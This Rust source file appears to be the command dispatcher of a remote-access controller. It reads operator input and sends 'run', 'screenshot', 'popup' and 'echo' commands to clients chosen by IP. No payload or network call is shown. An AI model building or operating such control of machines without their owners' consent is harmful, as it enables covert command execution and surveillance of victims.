use std::sync::{Arc, Mutex};
use std::{io, thread};
use log::info;
use crate::error::*;
use crate::error::CommandErr::*;
use crate::tools::*;
use crate::types::{HandleVec};


/// Handles commands.
pub(crate) fn handle_commands(handles: HandleVec) {
    let mut input = String::new();

    loop {
        io::stdin().read_line(&mut input).unwrap();
        dbg!(&input);

        let handles_clone = handles.clone();
        let input_clone = input.clone();

        // Create thread for running command
        process_output(parse_command(&input_clone, handles_clone), &handles);
        input.clear();
    }
}

/// Parses a &str input and runs the associated functions.
/// Returns the response from the client(s).
pub(crate) fn parse_command(input: &str, handles: HandleVec) -> Result<String, CommandErr> {
    let args = input.trim().split(' ').collect::<Vec<&str>>();

    let command: &str = &args[0].to_lowercase();

    log::trace!("About to lock in parse_command");
    // Lock handle_vec to get a clone to work with
    let handle_vec = handles.lock().unwrap().clone();
    log::trace!("Successfully locked in parse_command");
    
    // Ensure mutex is dropped to prevent deadlock
    drop(handles);

    info!("{}", &command);
    match command {
        "help" => {
            return print_help()
        }
        // Functions that require entire handle_vec
        "echoall" => {
            if args.len() == 1 {
                return Err(ArgNumErr("Incorrect number of arguments."))
            }
            return echoall(handle_vec, args[1..].join(" "));
        },
        "list" => return list(handle_vec),
        _ => {}
    };

    if args.len() <= 1 {
        return Err(InvalidCommandErr("Incorrect number of arguments."));
    }

    let ip = args[1];
    // Get specific handle by IP
    let handle = handle_vec
        .iter()
        .find(|handle| handle.ip == ip)
        .ok_or(NoClientsErr("No client found"))?
        .clone();
    
    let message = args[2..].join(" ");

    // Functions that require only one handle
    match command {
        "echo" => echo(handle, message),
        "run" => run(handle, message),
        "popup" => popup(handle, message),
        "screenshot" => screenshot(handle),
        _ => Err(InvalidCommandErr("The command specified does not exist")),
    }
}

pub(crate) fn process_output(output: Result<String, CommandErr>, handles: &HandleVec) {
    match output {
        Ok(msg) => log::info!("{}", msg),
        Err(err) => process_err(handles, err),
    }
}